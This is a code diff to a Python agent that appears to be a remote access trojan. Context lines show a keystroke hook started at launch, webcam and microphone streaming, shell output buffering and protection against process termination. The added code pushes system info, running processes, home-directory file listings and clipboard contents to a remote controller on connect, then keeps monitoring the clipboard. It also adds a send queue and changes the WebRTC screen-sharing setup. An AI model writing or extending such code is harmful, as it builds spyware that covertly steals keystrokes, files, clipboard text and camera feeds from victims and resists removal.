@@ -6,6 +6,7 @@ import uuid
 import json
 import subprocess
 import urllib.request
+import urllib.error
 import ssl
 import urllib.parse
 import platform
@@ -13,6 +14,7 @@ import base64
 import threading
 import argparse
 import getpass
+from datetime import datetime
 
 try:
     import keyring
@@ -152,8 +154,7 @@ class AsyncAgent:
         self.loop = None
 
         # Components
-        # Fix: Use full quality and scale for WebRTC (it handles bandwidth adaption)
-        self.capturer = ScreenCapturer(quality=100, scale=1.0)
+        self.capturer = ScreenCapturer(quality=70, scale=1.0)
         self.auditor = KeyAuditor(self.send_key_sync)  # Retain original auditor init
         self.auditor.start()  # START HOOKS IMMEDIATELY
         self.webcam = WebcamStreamer(quality=40)  # Retain original webcam settings
@@ -187,7 +188,7 @@ class AsyncAgent:
                 )
         self.direct_url = None
         self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
-        self.clipboard_handler.start_monitoring()  # Auto-Start Monitoring
+        # Monitoring starts in _push_initial_data background task
         self.device_settings = DeviceSettings()
         self.troll_handler = TrollHandler()
         self.direct_ws_clients = set()
@@ -237,6 +238,10 @@ class AsyncAgent:
         self.running = True
         self._shutdown_event = None
         self._heartbeat_trigger = None  # Wake-up trigger for immediate registry updates
+
+        # 🚀 Send Queue (Concurrency Saftey)
+        self.send_queue = asyncio.Queue()
+        self._sender_task = None
 
     def start(self, local_mode=False):
         # Apply process protection (ACL to deny termination)
@@ -397,6 +402,41 @@ class AsyncAgent:
         except Exception as e:
             print(f"[-] Port Liberator Error: {e}")
 
+    async def _push_initial_data(self):
+        """Pushes system info, process list, and initial file list in background (non-blocking)."""
+        try:
+            # 1. SysInfo
+            info = await self.loop.run_in_executor(
+                None, self.device_settings.get_sysinfo
+            )
+            self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode("utf-8"))
+
+            # 2. Process List
+            procs = await self.loop.run_in_executor(
+                None, self.process_mgr.list_processes
+            )
+            pm_data = self.process_mgr.to_json(procs)
+            self._send_async(protocol.OP_PM_DATA, pm_data)
+
+            # 3. File List (Home/Root)
+            home = os.path.expanduser("~")
+            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, home)
+            fm_resp = json.dumps({"files": files, "path": home}).encode("utf-8")
+            self._send_async(protocol.OP_FM_DATA, fm_resp)
+
+            # 4. Current Clipboard Sync (Fast)
+            content = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
+            if content:
+                entry = {"text": content, "timestamp": datetime.now().strftime("%H:%M:%S")}
+                self._send_async(protocol.OP_CLIP_ENTRY, json.dumps(entry).encode("utf-8"))
+
+            print("[+] Initial Data Pushed")
+
+            # Start clipboard monitoring for real-time updates
+            self.clipboard_handler.start_monitoring()
+        except Exception as e:
+            print(f"[-] Initial Push Partial Error: {e}")
+
     async def heartbeat_loop(self):
         """Sends heartbeat to Registry periodically. Can be woken up for immediate updates."""
         while not self._shutdown_event.is_set():
@@ -412,21 +452,28 @@ class AsyncAgent:
                     }
 
                     def do_request():
+                        # REVERT: Use standard urllib and OS certificate store.
+                        # NEVER TOUCH THE SSL CONTEXT AGAIN. 
+                        # This environment expects standard Windows SSL behavior.
                         req = urllib.request.Request(f"{self.registry_url}/api/update")
                         req.add_header(
                             "Content-Type", "application/json; charset=utf-8"
                         )
                         jsondata = json.dumps(payload).encode("utf-8")
                         req.add_header("Content-Length", len(jsondata))
+                        
+                        # Simple, standard call. Windows handles certificates.
                         with urllib.request.urlopen(req, jsondata, timeout=10):
                             pass
 
                     await self.loop.run_in_executor(None, do_request)
-                    print("[+] Registry updated.")
+                    if self.consecutive_heartbeat_fails > 0:
+                        print("[+] Registry: Connection Restored.")
                     self.consecutive_heartbeat_fails = 0
             except Exception as e:
-                print(f"[-] Heartbeat Failed: {e}")
                 self.consecutive_heartbeat_fails += 1
+                if self.consecutive_heartbeat_fails % 5 == 1: # Log every 5 fails to avoid spam
+                     print(f"[-] Registry: Update Failed (Fail Count: {self.consecutive_heartbeat_fails}): {e}")
                 if self.consecutive_heartbeat_fails >= 5:
                     if self.tunnel_mgr:
                         print(
@@ -452,9 +499,6 @@ class AsyncAgent:
                 # Cleanup pending tasks
                 for t in pending:
                     t.cancel()
-                if pending:
-                    # CodeRabbit: Await cancelled tasks to prevent "Task was destroyed" warnings
-                    await asyncio.gather(*pending, return_exceptions=True)
             except Exception:
                 pass  # Timeout reached, loop continues naturally
 
@@ -510,41 +554,43 @@ class AsyncAgent:
 
         print("[*] Task Watchdog: Stopping...")
 
-    def _send_async(self, opcode, payload=b""):
-        """Helper to safely send message from any thread to ALL clients"""
-        msg = bytes([opcode]) + payload
-        sent_to_broker = False
-
-        # Send to Broker
-        if self.ws and self.loop:
+    async def _sender_worker(self):
+        """Dedicated background task to send messages sequentially from the queue."""
+        print("[*] Send Worker Started")
+        while self.running:
             try:
-                asyncio.run_coroutine_threadsafe(send_msg(self.ws, msg), self.loop)
-                sent_to_broker = True
-            except Exception:
-                pass  # Handled by buffering below if critical
+                msg = await self.send_queue.get()
+                if self.ws:
+                    await send_msg(self.ws, msg)
+                
+                # Also send to direct clients if any
+                if self.direct_ws_clients:
+                    for client in list(self.direct_ws_clients):
+                        try:
+                            await send_msg(client, msg)
+                        except:
+                            self.direct_ws_clients.discard(client)
+                
+                self.send_queue.task_done()
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                print(f"[-] Send Worker Error: {e}")
+                await asyncio.sleep(0.1)
 
-        # Send to Direct Clients
-        if self.direct_ws_clients and self.loop:
-            for client in list(self.direct_ws_clients):
-                fut = asyncio.run_coroutine_threadsafe(send_msg(client, msg), self.loop)
-
-                # Cleanup on failure safely on the loop
-                def _handle_send_result(f, c=client):
-                    try:
-                        f.result()
-                    except Exception as e:
-                        print(f"[-] Send error: {e}")
-                        # Schedule removal on loop
-                        if self.loop.is_running():
-                            self.loop.call_soon_threadsafe(
-                                self.direct_ws_clients.discard, c
-                            )
-
-                fut.add_done_callback(_handle_send_result)
+    def _send_async(self, opcode, payload=b""):
+        """Helper to safely queue messages for sending from any thread."""
+        msg = bytes([opcode]) + payload
+        
+        # Queue for background sending
+        if self.loop and self.loop.is_running():
+            self.loop.call_soon_threadsafe(self.send_queue.put_nowait, msg)
+            sent = True
+        else:
+            sent = False
 
         # GHOST MODE BUFFERING
-        # If we are disconnected (no ws) or sending failed, buffer critical data
-        if not sent_to_broker and opcode in [
+        if not sent and opcode in [
             protocol.OP_SHELL_OUTPUT,
             protocol.OP_SHELL_CWD,
             protocol.OP_SHELL_EXIT,
@@ -591,18 +637,30 @@ class AsyncAgent:
 
             print("[WebRTC] Received SDP offer, creating answer...")
 
-            # Create or reuse WebRTC handler
-            if self.webrtc_handler is None:
-                self.webrtc_handler = WebRTCHandler()
+            # Create new WebRTC handler for each new offer to ensure clean state
+            if self.webrtc_handler is not None:
+                await self.webrtc_handler.close()
 
-            # Process offer and get answer
-            answer = await self.webrtc_handler.handle_offer(offer_sdp, offer_type)
+            async def on_ice_candidate(candidate):
+                try:
+                    ice_msg = json.dumps(candidate).encode("utf-8")
+                    await send_msg(source_ws, bytes([protocol.OP_ICE_CANDIDATE]) + ice_msg)
+                except Exception as e:
+                    print(f"[-] WebRTC: Failed to send ICE candidate: {e}")
 
-            # Add video track (screen sharing)
+            self.webrtc_handler = WebRTCHandler(on_ice_candidate_callback=on_ice_candidate)
+
+            # 1. Set Remote Description
+            await self.webrtc_handler.set_remote_description(offer_sdp, offer_type)
+
+            # 2. Add video track (screen sharing) BEFORE creating answer
             if self.capturer:
-                screen_track = create_screen_track(self.capturer, self.resource_mgr)
+                screen_track = create_screen_track(self, self.resource_mgr)
                 self.webrtc_handler.add_video_track(screen_track)
                 print("[WebRTC] Screen share track added")
+
+            # 3. Create Answer (now includes track)
+            answer = await self.webrtc_handler.create_answer()
 
             # Mark viewer as connected for resource manager
             if self.resource_mgr:
@@ -618,11 +676,6 @@ class AsyncAgent:
             answer_msg = json.dumps(answer).encode("utf-8")
             await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
             print("[WebRTC] Sent SDP answer - streaming via WebRTC now")
-
-            # Send any gathered ICE candidates
-            for candidate in self.webrtc_handler.get_pending_ice_candidates():
-                ice_msg = json.dumps(candidate).encode("utf-8")
-                await send_msg(source_ws, bytes([protocol.OP_ICE_CANDIDATE]) + ice_msg)
 
         except Exception as e:
             print(f"[-] WebRTC Offer Error: {e}")
@@ -807,6 +860,7 @@ class AsyncAgent:
             self._heartbeat_trigger = asyncio.Event()
 
             self._create_background_task(self.supervisor_watchdog())
+            self._sender_task = self._create_background_task(self._sender_worker())
 
             print("[*] Starting Internal Direct Server on port 8765...")
             # Allow all origins for now to simplify
@@ -1612,46 +1666,15 @@ class AsyncAgent:
                     # FLUSH OFF-LINE BUFFER
                     await self.flush_buffer()
 
-                    # ================================================================
-                    # INITIAL DATA PUSH (Refresh on Connect)
-                    # ================================================================
-                    try:
-                        # 1. SysInfo
-                        info = await self.loop.run_in_executor(
-                            None, self.device_settings.get_sysinfo
-                        )
-                        self._send_async(
-                            protocol.OP_SYSINFO_DATA, json.dumps(info).encode("utf-8")
-                        )
+                    # Start sender worker if not running
+                    if not self._sender_task or self._sender_task.done():
+                        self._sender_task = self._create_background_task(self._sender_worker())
 
-                        # 2. Process List
-                        procs = await self.loop.run_in_executor(
-                            None, self.process_mgr.list_processes
-                        )
-                        pm_data = self.process_mgr.to_json(procs)
-                        self._send_async(protocol.OP_PM_DATA, pm_data)
+                    # Non-Blocking/Background startup (Fix Black Screen)
+                    # We background this so the stream can start instantly
+                    self._create_background_task(self._push_initial_data(), name="InitialPush")
 
-                        # 3. File List (Home/Root)
-                        home = os.path.expanduser("~")
-                        files = await self.loop.run_in_executor(
-                            None, self.file_mgr.list_dir, home
-                        )
-                        fm_resp = json.dumps({"files": files, "path": home}).encode(
-                            "utf-8"
-                        )
-                        self._send_async(protocol.OP_FM_DATA, fm_resp)
-
-                        # 4. Clipboard History (Push immediately on connect)
-                        history = await self.clipboard_handler.get_windows_history()
-                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, json.dumps(history).encode("utf-8"))
-
-                        print("[+] Initial Data Pushed")
-
-                        # Start clipboard monitoring for real-time updates
-                        self.clipboard_handler.start_monitoring()
-                    except Exception as e:
-                        print(f"[-] Initial Push Partial Error: {e}")
-
+                    # Start message handler loop immediately
                     await self.handle_messages()
 
             except Exception as e:
@@ -1717,9 +1740,14 @@ class AsyncAgent:
         """Apply capture settings from Viewer"""
         print(f"[*] Applying Settings: {settings}")
         quality = settings.get("quality", 50)
-        scale = settings.get("scale", 90) / 100.0
+        scale = settings.get("scale", 100) / 100.0
         method = settings.get("method", "mss")
         fmt = settings.get("format", "WEBP")
+        fps = settings.get("fps", 30)
+
+        # Update Resource Manager (WebRTC uses this)
+        if self.resource_mgr:
+            self.resource_mgr.set_user_settings(fps=fps, quality=quality)
 
         # Recreate capturer with new settings
         if hasattr(self, "capturer") and self.capturer:
@@ -1734,10 +1762,16 @@ class AsyncAgent:
         active_method = (
             "DXCam" if getattr(self.capturer, "dxcam_active", False) else "MSS"
         )
-        print(f"[+] Settings Applied: Using {active_method} (Format: {fmt})")
+        print(f"[+] Settings Applied: Using {active_method} (Format: {fmt}, Scale: {scale}, FPS: {fps})")
 
     async def stream_screen(self, target_ws=None):
         print("[*] Screen Streaming Task Started")
+        
+        # Ensure capturer exists if it was cleaned up by a previous task
+        if self.capturer is None:
+            print("[*] Reinitializing Screen Capturer...")
+            self.capturer = ScreenCapturer(quality=70, scale=1.0)
+            
         ws_to_use = target_ws if target_ws else self.ws
         pending_send = None
         try:
@@ -1787,15 +1821,13 @@ class AsyncAgent:
             print(f"[-] Screen Stream Fatal Error: {e}")
         finally:
             self.streaming = False
-            # Explicit cleanup to prevent DXCam lock
-            if hasattr(self, "capturer") and self.capturer:
-                if hasattr(self.capturer, "release"):
-                    self.capturer.release()
-                self.capturer = None
+            # REVERTED: Do NOT nullify the capturer instance here!
+            # It must persist for WebRTC tracks to survive task switching.
+            print("[*] Screen Stream Task Stopped")
 
-            # Ensure global cleanup is triggered if we detected disconnect here
-            # (In case the main receive loop is stuck)
-            await self._cleanup_webrtc()
+            # REVERTED: Do NOT call _cleanup_webrtc here.
+            # connect_loop handles this on disconnect, and WebRTC has its own signals.
+            # Calling it here kills the new WebRTC stream immediately.
 
     async def stream_webcam(self, target_ws=None):
         print("[*] Webcam Streaming Task Started")
@@ -1815,6 +1847,7 @@ class AsyncAgent:
             print(f"[-] Webcam Stream Error: {e}")
         finally:
             self.cam_streaming = False
+            print("[*] Webcam Stream Task Stopped")
 
     async def stream_mic(self, target_ws=None):
         print("[*] Mic Streaming Task Started")
